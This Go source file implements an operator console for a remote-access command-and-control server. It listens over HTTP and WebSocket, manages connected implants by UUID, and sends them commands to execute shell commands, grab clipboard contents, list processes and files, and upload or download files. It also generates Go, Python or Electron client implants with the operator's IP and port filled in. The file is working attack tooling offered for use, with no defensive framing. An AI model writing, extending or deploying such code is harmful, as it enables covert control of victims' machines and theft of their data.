package main

import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

type Client struct {
	Conn         *websocket.Conn
	UUID         string
	Addr         string
	ResponseChan chan string
}

type ClientManager struct {
	HTTPClients               map[string]*Client
	WebSocketClients          map[string]*Client
	mu                        sync.RWMutex
	addHTTPClientChan         chan *Client
	removeHTTPClientChan      chan string
	addWebSocketClientChan    chan *Client
	removeWebSocketClientChan chan string
	messageChan               chan Message
}

type Message struct {
	UUID    string
	Content string
}

type FileInfo struct {
	Name    string
	Size    int64
	ModTime time.Time
}

func GetFilesInfo() ([]FileInfo, error) {
	var filesInfo []FileInfo

	// 读取当前目录
	files, err := ioutil.ReadDir(".")
	if err != nil {
		return nil, err
	}

	// 遍历文件并获取信息
	for _, file := range files {
		if !file.IsDir() {
			filesInfo = append(filesInfo, FileInfo{
				Name:    file.Name(),
				Size:    file.Size(),
				ModTime: file.ModTime(),
			})
		}
	}

	return filesInfo, nil
}

func IsValidIP(ip string) bool {
	return net.ParseIP(ip) != nil
}

func IsValidPort(port string) bool {
	p, err := strconv.Atoi(port)
	return err == nil && p > 0 && p < 65536
}

func PrintUseCommandHelp() {
	var availableCommands = []string{
		"list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes", "help", "lls",
	}
	color.Set(color.FgCyan)
	fmt.Println("Available commands:")
	for _, cmd := range availableCommands {
		fmt.Printf("  %s\n", cmd)
	}
	color.Unset()
}

func PrintHelp() {
	color.Set(color.FgCyan)
	fmt.Println("Available commands:")
	fmt.Println("  http            Start HTTP server")
	fmt.Println("  websocket       Start WebSocket server")
	fmt.Println("  list websocket  List all active WebSocket connections")
	fmt.Println("  use <UUID>      Interact with a specific WebSocket connection (by UUID)")
	fmt.Println("  generate        Generate a client template with options: lang=<go|python|electron> ip=<IP_ADDRESS> port=<PORT> protocol=<ws|wss>")
	fmt.Println("  help            Show this help information")
	color.Unset()
}

func NewClientManager() *ClientManager {
	return &ClientManager{
		HTTPClients:               make(map[string]*Client),
		WebSocketClients:          make(map[string]*Client),
		addHTTPClientChan:         make(chan *Client, 100),
		removeHTTPClientChan:      make(chan string, 100),
		addWebSocketClientChan:    make(chan *Client, 100),
		removeWebSocketClientChan: make(chan string, 100),
		messageChan:               make(chan Message, 100),
	}
}

func (cm *ClientManager) Start() {
	for {
		select {
		case client := <-cm.addHTTPClientChan:
			cm.mu.Lock()
			_, exists := cm.HTTPClients[client.UUID]
			cm.mu.Unlock()
			if !exists {
				fmt.Printf("New HTTP connection: %s, UUID: %s\n", client.Addr, client.UUID)
			}

		case uuid := <-cm.removeHTTPClientChan:
			cm.mu.Lock()
			delete(cm.HTTPClients, uuid)
			cm.mu.Unlock()
			fmt.Printf("HTTP connection closed: UUID: %s\n", uuid)

		case client := <-cm.addWebSocketClientChan:
			cm.mu.Lock()
			cm.WebSocketClients[client.UUID] = client
			cm.mu.Unlock()
			fmt.Printf("New WebSocket connection: %s, UUID: %s\n", client.Addr, client.UUID)

		case uuid := <-cm.removeWebSocketClientChan:
			cm.mu.Lock()
			delete(cm.WebSocketClients, uuid)
			cm.mu.Unlock()
			fmt.Printf("WebSocket connection closed: UUID: %s\n", uuid)

		case msg := <-cm.messageChan:
			cm.mu.RLock()
			if client, exists := cm.WebSocketClients[msg.UUID]; exists {
				response := map[string]string{"command": msg.Content}
				data, _ := json.Marshal(response)
				if err := client.Conn.WriteMessage(websocket.TextMessage, data); err != nil {
					fmt.Printf("Failed to send WebSocket message: %v\n", err)
				} else {
					fmt.Printf("WebSocket message sent to UUID: %s, Content: %s\n", msg.UUID, msg.Content)
				}
			} else if client, exists := cm.HTTPClients[msg.UUID]; exists {
				response := map[string]string{"command": msg.Content}
				jsonResponse, err := json.Marshal(response)
				if err != nil {
					fmt.Printf("Failed to marshal response to JSON: %v\n", err)
				}
				client.ResponseChan <- string(jsonResponse)
				fmt.Printf("HTTP message queued for UUID: %s, Content: %s\n", msg.UUID, msg.Content)
			} else {
				fmt.Printf("Connection not found: %s\n", msg.UUID)
			}
			cm.mu.RUnlock()
		}
	}
}

func handleFileUpload(w http.ResponseWriter, r *http.Request) {
	err := r.ParseMultipartForm(10 << 20) // 10 MB limit
	if err != nil {
		http.Error(w, "Error parsing form", http.StatusInternalServerError)
		return
	}

	file, handler, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Error retrieving file", http.StatusInternalServerError)
		return
	}
	defer file.Close()

	fmt.Printf("Uploaded file: %s, size: %d bytes\n", handler.Filename, handler.Size)

	dst, err := os.Create(handler.Filename)
	if err != nil {
		http.Error(w, "Error saving file", http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	_, err = io.Copy(dst, file)
	if err != nil {
		http.Error(w, "Error writing file", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("File uploaded successfully"))
}

func handleFileDownload(w http.ResponseWriter, r *http.Request) {
	fileName := r.URL.Query().Get("filename")
	if fileName == "" {
		http.Error(w, "Filename is required", http.StatusBadRequest)
		return
	}

	file, err := os.Open(fileName)
	if err != nil {
		http.Error(w, "File not found", http.StatusNotFound)
		return
	}
	defer file.Close()

	w.Header().Set("Content-Disposition", "attachment; filename="+fileName)
	w.Header().Set("Content-Type", "application/octet-stream")
	io.Copy(w, file)
}

func httpHandler(cm *ClientManager, w http.ResponseWriter, r *http.Request) {
	uuid := r.Header.Get("UUID")
	if uuid == "" {
		http.Error(w, "UUID is required", http.StatusBadRequest)
		return
	}

	cm.mu.Lock()
	client, exists := cm.HTTPClients[uuid]
	if !exists {
		client = &Client{
			UUID:         uuid,
			Addr:         r.RemoteAddr,
			ResponseChan: make(chan string),
		}
		cm.HTTPClients[uuid] = client
	}
	cm.addHTTPClientChan <- client
	cm.mu.Unlock()
	if r.Method == http.MethodPost {

		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Failed to read request body", http.StatusInternalServerError)
			return
		}
		defer r.Body.Close()
		message := string(body)
		fmt.Printf("Received message from %s: %s\n", r.RemoteAddr, message)
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("Message received"))
		return
	}

	select {
	case response := <-client.ResponseChan:
		w.WriteHeader(http.StatusOK)
		res := map[string]string{"command": response}
		jsonResponse, err := json.Marshal(res)
		if err != nil {
			fmt.Printf("Failed to marshal response to JSON: %v\n", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		w.Write([]byte(string(jsonResponse)))

	case <-time.After(30 * time.Second):
		res := map[string]string{"message": "StatusGatewayTimeout"}
		jsonResponse, _ := json.Marshal(res)
		http.Error(w, string(jsonResponse), http.StatusGatewayTimeout)
	}
}

func saveFile(filename string, data []byte) error {
	err := os.WriteFile(filename, data, 0644)
	if err != nil {
		fmt.Printf("Error saving file: %v\n", err)
		return err
	}
	fmt.Printf("File saved successfully: %s\n", filename)
	return nil
}

func wsuploadFileHandler(conn *websocket.Conn, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("failed to create file: %w", err)
	}
	defer file.Close()

	for {
		messageType, data, err := conn.ReadMessage()
		if err != nil {
			if websocket.IsCloseError(err, websocket.CloseNormalClosure) {
				break
			}
			return fmt.Errorf("failed to read file content: %w", err)
		}
		if messageType == websocket.BinaryMessage {
			_, err = file.Write(data)
			if err != nil {
				return fmt.Errorf("failed to write file: %w", err)
			}
		} else {
			break
		}
	}

	fmt.Printf("File %s uploaded successfully\n", filename)
	return nil
}

func wsdownloadFileHandler(conn *websocket.Conn, filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	buffer := make([]byte, 1024)
	var totalBytesSent int64
	for {
		n, readErr := file.Read(buffer)
		if n > 0 {
			totalBytesSent += int64(n)
			if writeErr := conn.WriteMessage(websocket.BinaryMessage, buffer[:n]); writeErr != nil {
				return fmt.Errorf("failed to send file content: %w", writeErr)
			}
		}
		if readErr != nil {
			if readErr == io.EOF {
				break
			}
			conn.WriteMessage(websocket.TextMessage, []byte(fmt.Sprintf("Error: failed to read file: %v", readErr)))
			return readErr
		}
	}
	successMessage := map[string]string{"status": "completed", "file": filename}
	data, _ := json.Marshal(successMessage)
	if err := conn.WriteMessage(websocket.TextMessage, data); err != nil {
		return fmt.Errorf("failed to send completion message: %w", err)
	}

	fmt.Printf("File %s sent successfully\n", filename)
	return nil
}

func wsHandler(cm *ClientManager, conn *websocket.Conn) {
	defer conn.Close()

	address := conn.RemoteAddr().String()
	newUUID := uuid.New().String()
	client := &Client{Conn: conn, UUID: newUUID, Addr: address}

	cm.addWebSocketClientChan <- client
	successMessage := map[string]string{"status": "success", "message": "Connection successful", "uuid": newUUID}
	data, _ := json.Marshal(successMessage)
	conn.WriteMessage(websocket.TextMessage, data)
	var uploadFile *os.File
	for {
		messageType, message, err := conn.ReadMessage()
		if err != nil {
			cm.removeWebSocketClientChan <- newUUID
			break
		}
		switch messageType {
		case websocket.TextMessage:
			var req map[string]interface{}
			if err := json.Unmarshal(message, &req); err != nil {
				res := map[string]string{"message": "Invalid JSON format"}
				data, _ := json.Marshal(res)
				conn.WriteMessage(websocket.TextMessage, data)
				continue
			}

			action, ok := req["action"].(string)
			if !ok {
				fmt.Printf("invalid action: %s\n", action)
				res := map[string]string{"message": "Missing or invalid 'action' field"}
				data, _ := json.Marshal(res)
				conn.WriteMessage(websocket.TextMessage, data)
				continue
			}
			switch action {
			case "send_result":
				if result, ok := req["result"].(string); ok {
					fmt.Printf("Result from UUID %s: %s\n", newUUID, result)
				} else {
					fmt.Println("Result key not found in message.")
				}
			case "upload_file":
				if filename, ok := req["filename"].(string); ok {
					fmt.Printf("Starting upload for file: %s\n", filename)
					uploadFile, err = os.Create(filename)
					if err != nil {
						fmt.Printf("Error creating file %s: %v\n", filename, err)
						conn.WriteMessage(websocket.TextMessage, []byte("Error creating file"))
					}
				} else {
					conn.WriteMessage(websocket.TextMessage, []byte("Filename not found in message."))
				}
			case "download_file":
				if filename, ok := req["filename"].(string); ok {
					fmt.Printf("download %s ing\n", filename)
					err = wsdownloadFileHandler(conn, filename)
				} else {
					fmt.Println("Filename not found in message.")
				}
			case "upload_completed":
				if uploadFile != nil {
					fmt.Println("Upload completed successfully.")
					uploadFile.Close()
					uploadFile = nil
				} else {
					fmt.Println("No file was being uploaded.")
				}
			default:
				conn.WriteMessage(websocket.TextMessage, []byte("Unsupported action"))
			}
		case websocket.BinaryMessage:
			if uploadFile != nil {
				_, err = uploadFile.Write(message)
				if err != nil {
					fmt.Printf("Error writing to file: %v\n", err)
					conn.WriteMessage(websocket.TextMessage, []byte("Error writing to file"))
				}
			} else {
				fmt.Println("Received binary data without an active upload.")
			}
		default:
			fmt.Printf("Unsupported message type: %d\n", messageType)
		}
	}
}

func listClients(cm *ClientManager, protocol string) []string {
	cm.mu.RLock()
	defer cm.mu.RUnlock()

	var clients map[string]*Client
	if protocol == "http" {
		clients = cm.HTTPClients
	} else if protocol == "websocket" {
		clients = cm.WebSocketClients
	} else {
		clients = nil
	}

	var uuids []string
	if protocol == "all" {
		for uuid := range cm.HTTPClients {
			uuids = append(uuids, uuid)
		}
		for uuid := range cm.WebSocketClients {
			uuids = append(uuids, uuid)
		}
	} else {
		for uuid := range clients {
			uuids = append(uuids, uuid)
		}
	}
	return uuids
}

func sendMessageToClient(cm *ClientManager, uuid, message string) {
	cm.messageChan <- Message{UUID: uuid, Content: message}
}

func generateClientTemplate(language, ip, port, protocol string) error {
	// Validate language
	if language != "go" && language != "python" && language != "electron" {
		return fmt.Errorf("unsupported language: %s", language)
	}

	// Define source and target paths
	sourceDir := fmt.Sprintf("client/%s/%s_client", language, protocol)
	targetDir := fmt.Sprintf("output_client/%s/%s_client_%s", language, protocol, port)

	// Remove the target directory if it exists
	err := os.RemoveAll(targetDir)
	if err != nil {
		return fmt.Errorf("failed to remove existing target directory: %w", err)
	}

	// Recreate the target directory
	err = os.MkdirAll(targetDir, os.ModePerm)
	if err != nil {
		return fmt.Errorf("failed to create target directory: %w", err)
	}

	// Copy files and apply template replacements
	err = filepath.Walk(sourceDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Determine the relative path to replicate directory structure
		relPath, err := filepath.Rel(sourceDir, path)
		if err != nil {
			return err
		}

		targetPath := filepath.Join(targetDir, relPath)

		// Handle directories
		if info.IsDir() {
			return os.MkdirAll(targetPath, os.ModePerm)
		}

		// Handle files
		return processFile(language, protocol, path, targetPath, ip, port)
	})

	if err != nil {
		return fmt.Errorf("failed to process files: %w", err)
	}

	fmt.Printf("Client template generated successfully at %s\n", targetDir)
	return nil
}

// processFile processes a file by copying it and applying template replacements based on language.
func processFile(language, protocol, srcPath, dstPath, ip, port string) error {
	content, err := os.ReadFile(srcPath)
	if err != nil {
		return fmt.Errorf("failed to read source file: %w", err)
	}

	template := string(content)

	// Apply replacements based on language
	switch language {
	case "go", "python":
		// Replace placeholders in the main template file (e.g., .go or .py file)
		fileExt := "go"
		if language == "python" {
			fileExt = "py"
		}
		if strings.HasSuffix(srcPath, fmt.Sprintf("%s_client.%s", protocol, fileExt)) {
			template = strings.ReplaceAll(template, "{ip}", ip)
			template = strings.ReplaceAll(template, "{port}", port)
		}
	case "electron":
		// Replace placeholders in the main.js file
		if strings.HasSuffix(srcPath, "main.js") {
			template = strings.ReplaceAll(template, "{ip}", ip)
			template = strings.ReplaceAll(template, "{port}", port)
		}
	}

	// Write the processed content to the target file
	err = os.WriteFile(dstPath, []byte(template), os.ModePerm)
	if err != nil {
		return fmt.Errorf("failed to write to destination file: %w", err)
	}
	return nil
}

func handleGenerateCommand(params []string) {
	if len(params) == 0 {
		fmt.Println("Usage: generate lang=<go|python> ip=<IP_ADDRESS> port=<PORT> protocol=<ws|wss|http>")
		return
	}

	language := "go"
	ip := "127.0.0.1"
	port := "8081"
	protocol := "ws"
	for i := 0; i < len(params); i++ {
		part := params[i]
		if strings.HasPrefix(part, "--") {
			key := strings.TrimPrefix(part, "--")
			if i+1 < len(params) && !strings.HasPrefix(params[i+1], "--") {
				value := params[i+1]
				i++
				switch key {
				case "lang":
					if value != "go" && value != "python" && value != "electron" {
						fmt.Printf("Invalid language: %s. Supported languages are 'go' or 'python' or 'electron'.\n", value)
						return
					}
					language = value
				case "ip":
					if !IsValidIP(value) {
						fmt.Printf("Invalid IP address: %s\n", value)
						return
					}
					ip = value
				case "port":
					if !IsValidPort(value) {
						fmt.Printf("Invalid port: %s. Port must be a number between 1 and 65535.\n", value)
						return
					}
					port = value
				case "protocol":
					protocol = value
				default:
					fmt.Printf("Unknown parameter: --%s\n", key)
					return
				}
			} else {
				fmt.Printf("Missing value for parameter: --%s\n", key)
				return
			}
		}
	}
	if language == "" || ip == "" || port == "" || protocol == "" {
		fmt.Println("Missing one or more required parameters.")
		return
	}

	err := generateClientTemplate(language, ip, port, protocol)
	if err != nil {
		fmt.Printf("Error generating client: %v\n", err)
	}
}

func handleUseCommand(cm *ClientManager, uuid string) {
	cm.mu.RLock()
	var client *Client
	var exists bool
	if cm.HTTPClients[uuid] != nil {
		client, exists = cm.HTTPClients[uuid]
	} else if cm.WebSocketClients[uuid] != nil {
		client, exists = cm.WebSocketClients[uuid]
	} else {
		fmt.Printf("No Client to use \n")
		return
	}
	cm.mu.RUnlock()
	if !exists {
		color.Set(color.FgRed)
		fmt.Println("Connection not found1")
		color.Unset()
		return
	}

	config := readline.Config{
		Prompt: fmt.Sprintf("Enter message for %s (or 'back' to return): ", uuid),
		AutoComplete: readline.NewPrefixCompleter(
			readline.PcItem("list_files"),
			readline.PcItem("get_clipboard"),
			readline.PcItem("download_file"),
			readline.PcItem("upload_file"),
			readline.PcItem("execute_command"),
			readline.PcItem("list_processes"),
			readline.PcItem("help"),
			readline.PcItem("lls"),
		),
	}
	rl, err := readline.NewEx(&config)
	if err != nil {
		fmt.Println("Failed to initialize readline:", err)
		return
	}
	defer rl.Close()

	for {
		line, err := rl.Readline()
		if err != nil {
			break
		}

		message := strings.TrimSpace(line)

		if message == "back" || message == "bk" {
			break
		}

		switch message {
		case "list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes":
			if client.Conn != nil {
				sendMessageToClient(cm, uuid, message)
			} else if client.ResponseChan != nil {
				select {
				case client.ResponseChan <- message:
					fmt.Printf("Command sent to HTTP client UUID %s: %s\n", uuid, message)
				default:
					fmt.Printf("HTTP client UUID %s is not waiting for a response\n", uuid)
				}
			} else {
				fmt.Printf("Client UUID %s has no active connection\n", uuid)
			}
		case "help":
			PrintUseCommandHelp()
		case "lls":
			filesInfo, err := GetFilesInfo()
			if err != nil {
				fmt.Printf("can't get files info: %v", err)
			}
			for _, info := range filesInfo {
				fmt.Printf("filename: %s, size: %d bytes, modtime: %s\n", info.Name, info.Size, info.ModTime.Format("2006-01-02 15:04:05"))
			}

		default:
			if client.Conn != nil {
				sendMessageToClient(cm, uuid, message)
			} else if client.ResponseChan != nil {
				select {
				case client.ResponseChan <- message:
					fmt.Printf("Command sent to HTTP client UUID %s: %s\n", uuid, message)
				default:
					fmt.Printf("HTTP client UUID %s is not waiting for a response\n", uuid)
				}
			} else {
				fmt.Printf("Client UUID %s has no active connection\n", uuid)
			}
		}
	}
}

func generateCombinations() []readline.PrefixCompleterInterface {
	options := map[string][]string{
		"--lang":     {"go", "python", "electron"},
		"--protocol": {"ws", "http"},
		"--ip":       {"127.0.0.1"},
		"--port":     {"8080", "8081"},
	}
	order := []string{"--lang", "--protocol", "--ip", "--port"}

	var result []readline.PrefixCompleterInterface
	generateCombinationsRecursive(options, order, 0, "", &result)

	return result
}

func generateCombinationsRecursive(options map[string][]string, order []string, index int, current string, result *[]readline.PrefixCompleterInterface) {
	if index >= len(order) {
		*result = append(*result, readline.PcItem(strings.TrimSpace(current)))
		return
	}

	opt := order[index]
	values := options[opt]

	for _, value := range values {
		generateCombinationsRecursive(options, order, index+1, current+" "+opt+" "+value, result)
	}
}

func main() {
	cm := NewClientManager()
	go cm.Start()
	config := readline.Config{
		Prompt:       "Enter command: ",
		HistoryFile:  ".readline.tmp",
		AutoComplete: readline.NewPrefixCompleter(),
	}
	rl, err := readline.NewEx(&config)
	if err != nil {
		fmt.Println("Failed to initialize readline:", err)
		return
	}
	defer rl.Close()

	go func() {
		for {
			uuids := listClients(cm, "all")
			var completers []readline.PrefixCompleterInterface
			for _, uuid := range uuids {
				completers = append(completers, readline.PcItem(uuid))
			}
			combinations := generateCombinations()
			rl.Config.AutoComplete = readline.NewPrefixCompleter(
				readline.PcItem("http"),
				readline.PcItem("websocket"),
				readline.PcItem("list", readline.PcItem("http"), readline.PcItem("websocket"), readline.PcItem("all")),
				readline.PcItem("use", completers...),
				readline.PcItem("generate", combinations...),
				readline.PcItem("help"),
			)
		}
	}()

	for {
		line, err := rl.Readline()
		if err != nil {
			break
		}

		command := strings.Fields(line)
		if len(command) == 0 {
			continue
		}

		switch command[0] {
		case "use":
			if len(command) > 1 {
				handleUseCommand(cm, command[1])
			} else {
				fmt.Println("Usage: use <UUID>")
			}
		case "http":
			http.HandleFunc("/client", func(w http.ResponseWriter, r *http.Request) {
				httpHandler(cm, w, r)
			})
			http.HandleFunc("/client/upload", handleFileUpload)
			http.HandleFunc("/client/download", handleFileDownload)
			go http.ListenAndServe(":8080", nil)
			color.Set(color.FgYellow)
			fmt.Println("HTTP server started on port 8080")
			color.Unset()
		case "websocket":
			http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
				upgrader := websocket.Upgrader{}
				upgrader.CheckOrigin = func(r *http.Request) bool { return true }
				conn, err := upgrader.Upgrade(w, r, nil)
				if err != nil {
					fmt.Println("Failed to upgrade to WebSocket:", err)
					return
				}
				wsHandler(cm, conn)
			})
			go http.ListenAndServe(":8081", nil)
			color.Set(color.FgYellow)
			fmt.Println("WebSocket server started on port 8081")
			color.Unset()
		case "list":
			if len(command) > 1 && command[1] == "websocket" {
				uuids := listClients(cm, "websocket")
				fmt.Println("Active WebSocket sessions:")
				for _, uuid := range uuids {
					fmt.Println("UUID:", uuid)
				}
			} else if len(command) > 1 && command[1] == "http" {
				uuids := listClients(cm, "http")
				fmt.Println("Active http sessions:")
				for _, uuid := range uuids {
					fmt.Println("UUID:", uuid)
				}
			} else if len(command) > 1 && command[1] == "all" {
				uuids_http := listClients(cm, "http")
				fmt.Println("All sessions:")
				for _, uuid := range uuids_http {
					fmt.Println("UUID:", uuid)
				}
				uuids_websocket := listClients(cm, "websocket")
				for _, uuid := range uuids_websocket {
					fmt.Println("UUID:", uuid)
				}
			} else {
				fmt.Println("Usage: list websocket")
			}
		case "generate":
			handleGenerateCommand(command[1:])
		case "help":
			PrintHelp()
		default:
			color.Set(color.FgRed)
			fmt.Println("Invalid command, please try again.")
			color.Unset()
		}
	}
}
